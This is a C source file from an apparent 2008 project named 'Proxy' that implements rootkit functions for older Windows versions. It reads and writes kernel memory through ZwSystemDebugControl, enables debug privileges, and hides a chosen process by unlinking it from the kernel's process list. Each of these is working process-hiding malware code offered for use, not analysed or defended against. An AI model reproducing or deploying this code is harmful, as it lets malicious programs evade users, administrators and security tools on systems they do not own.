/**
 * Proxy
 * Copyright ©2008 Loki - All Rights Reserved
 **/

/**
 * Microsoft Windows NT 4.0:
 *  PIDOFFSET   = 148;
 *  FLINKOFFSET = 152;
 * 
 * Microsoft Windows 2000:
 *  PIDOFFSET   = 156;
 *  FLINKOFFSET = 160;
 *   
 * Microsoft Windows XP:
 *  PIDOFFSET   = 132;
 *  FLINKOFFSET = 136;
 *     
 * Microsoft Windows Server 2003:
 *  PIDOFFSET   = 132;
 *  FLINKOFFSET = 136;
 **/

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include "global.h"
#include "kernel.h"

/**
 * @name                          kernel_read
 * @param                 Addr    Address to read from
 * @return                        Data from kernel memory
 * @note                          Read from kernel memory
 **/
ulong kernel_read( ulong Addr )
{
    struct mem_t Mem;
    ulong Data = 0;
    Mem.KernelAddr = (pvoid)Addr;
    Mem.UserAddr   = &Data;
    Mem.Length     = 4;
    ZwSystemDebugControl( 8, &Mem, sizeof(Mem), 0, 0, 0 );
    return Data;
}

/**
 * @name                          kernel_write
 * @param                 Addr    Address to write to
 * @param                 Data    Data to write to kernel memory
 * @note                          Write to kernel memory
 **/
void kernel_write( ulong Addr, ulong Data )
{
    struct mem_t Mem;
    Mem.KernelAddr = (pvoid)Addr;
    Mem.UserAddr   = &Data;
    Mem.Length     = 4;
    ZwSystemDebugControl( 9, &Mem, sizeof(Mem), 0, 0, 0 );
}

/**
 * @name                          kernel_get_priv
 * @note                          Get debug privledges
 **/
void kernel_get_priv( void )
{
    TOKEN_PRIVILEGES Priv;
    HANDLE           Token = NULL;
    Priv.PrivilegeCount           = 1;
    Priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &Token );
    LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &Priv.Privileges[0].Luid );
    AdjustTokenPrivileges( Token, FALSE, &Priv, sizeof(Priv), NULL, NULL );
}

/**
 * @name                          kernel_proc_hide
 * @param            ProcessId    Process id to hide
 * @note                          Patch kernel memory to hide a process
 **/
void kernel_proc_hide( ulong ProcessId )
{
    HMODULE    Kernel      = NULL;
    char       Name[256],
              *Raw;
    DWORD      BaseAddress,
               Size,
               SystemProcess,
               InitSysProcess,
               FlinkOffset = 0x88,
               PidOffset   = 0x84,
               First,
               Second,
               Cur,
               Prev,
               Next;
    sys_info_t Info;
    kernel_get_priv();
    Size = sizeof( sys_info_t );
    NtQuerySystemInformation( 11, 0, 0, &Size );
    Raw  = (char*)calloc( Size, 1 );
    NtQuerySystemInformation( 11, Raw, Size, NULL );
    Info = *(sys_info_t *)Raw;
    free( Raw );
    BaseAddress    = (ulong)Info.Base;
    memcpy( Name, (Info.ModuleNameOffset + Info.ImageName), (256 - Info.ModuleNameOffset) );
    Kernel         = LoadLibrary( Name );
    InitSysProcess = (ulong)GetProcAddress( Kernel, "PsInitialSystemProcess" );
    SystemProcess  = kernel_read( InitSysProcess - (ulong)Kernel + BaseAddress );
    FreeLibrary( Kernel );
    First  = (kernel_read( SystemProcess + FlinkOffset ) - FlinkOffset);
    Second = (kernel_read( First         + FlinkOffset ) - FlinkOffset);
    Cur = SystemProcess;
    do {
        Prev = Cur;
        Cur  = (kernel_read( Cur + FlinkOffset ) - FlinkOffset);
        Next = (kernel_read( Cur + FlinkOffset ) - FlinkOffset);
        if( kernel_read(Cur + PidOffset) == ProcessId )
        {
            kernel_write( Prev + FlinkOffset,     Next   + FlinkOffset );
            kernel_write( Next + FlinkOffset + 4, Prev   + FlinkOffset );
            kernel_write( Cur  + FlinkOffset,     Second + FlinkOffset );
            kernel_write( Cur  + FlinkOffset + 4, First  + FlinkOffset );
            break;
        }
    } while( SystemProcess != Cur );
}
